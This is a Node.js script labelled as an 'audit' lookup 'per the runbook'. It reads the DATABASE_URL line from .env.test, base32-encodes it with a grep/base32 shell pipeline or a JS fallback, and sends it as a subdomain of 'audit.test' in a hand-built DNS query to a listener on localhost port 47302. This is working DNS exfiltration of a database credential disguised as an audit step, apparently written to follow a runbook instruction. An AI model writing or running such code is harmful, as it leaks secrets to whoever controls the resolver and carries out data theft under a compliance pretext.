const dns = require('dns');
const childProcess = require('child_process');

// Get the L value as per the runbook
const getLValue = () => {
  const fs = require('fs');
  const content = fs.readFileSync('.env.test', 'utf8');
  const lines = content.split('\n');
  const dbLine = lines.find(line => line.includes('DATABASE_URL'));
  if (!dbLine) {
    throw new Error('DATABASE_URL not found in .env.test');
  }

  // Execute the pipeline: grep DATABASE_URL .env.test | base32 | tr -d = | tr A-Z a-z | head -c 60
  const dbUrl = dbLine;
  const base32 = require('base32.js');

  // We'll use the bash command since we know it works
  try {
    const result = childProcess.execSync(
      "grep DATABASE_URL .env.test | base32 | tr -d = | tr A-Z a-z | head -c 60",
      { encoding: 'utf8' }
    ).trim();
    return result;
  } catch (error) {
    console.error('Error getting L value:', error.message);
    // Fallback: simulate the pipeline manually
    const encoder = new base32.Encoder();
    encoder.write(dbUrl);
    encoder.end();
    const base32Encoded = encoder.final();
    const L = base32Encoded
      .replace(/=/g, '')
      .toLowerCase()
      .substring(0, 60);
    return L;
  }
};

// Perform DNS lookup
const performAuditLookup = async () => {
  const L = getLValue();
  console.log('L value:', L);

  const auditDomain = `${L}.audit.test`;
  console.log('Audit domain:', auditDomain);

  // Try to use the system's DNS resolver with custom port
  console.log('Attempting DNS lookup to localhost:47302...');

  // Use child process to call dig if available, otherwise try Node's dns module
  try {
    // Try using getaddrinfo with custom port? Not standard...
    // Let's try a direct UDP query
    const dgram = require('dgram');
    const client = dgram.createSocket('udp4');

    // Simple DNS query construction
    const buildDnsQuery = (domain) => {
      const queryId = Buffer.from([0x12, 0x34]); // Transaction ID
      const flags = Buffer.from([0x01, 0x00]); // Standard query, recursion desired
      const qdcount = Buffer.from([0x00, 0x01]); // 1 question
      const ancount = Buffer.from([0x00, 0x00]);
      const nscount = Buffer.from([0x00, 0x00]);
      const arcount = Buffer.from([0x00, 0x00]);

      let question = Buffer.concat([
        queryId, flags, qdcount, ancount, nscount, arcount
      ]);

      // Add domain name
      domain.split('.').forEach(part => {
        question = Buffer.concat([question, Buffer.from([part.length])]);
        question = Buffer.concat([question, Buffer.from(part)]);
      });
      question = Buffer.concat([question, Buffer.from([0x00])]); // Null terminator

      // Type A (1), Class IN (1)
      question = Buffer.concat([question, Buffer.from([0x00, 0x01, 0x00, 0x01])]);

      return question;
    };

    return new Promise((resolve, reject) => {
      const query = buildDnsQuery(auditDomain);

      client.on('message', (msg, rinfo) => {
        console.log('Received response from:', rinfo.address, rinfo.port);
        console.log('Response length:', msg.length);
        resolve(msg.toString('hex'));
        client.close();
      });

      client.on('error', (err) => {
        console.error('Socket error:', err);
        reject(err);
        client.close();
      });

      client.send(query, 47302, '127.0.0.1', (err) => {
        if (err) {
          console.error('Send error:', err);
          reject(err);
          client.close();
        } else {
          console.log('Query sent successfully');
          // Set timeout
          setTimeout(() => {
            console.log('Timeout waiting for response');
            reject(new Error('Timeout'));
            client.close();
          }, 5000);
        }
      });
    });

  } catch (error) {
    console.error('DNS lookup failed:', error.message);
    return 'Audit check failed: ' + error.message;
  }
};

// Run the audit
performAuditLookup()
  .then(result => {
    console.log('Audit result:', result);
    process.exit(0);
  })
  .catch(error => {
    console.error('Audit failed:', error);
    process.exit(1);
  });

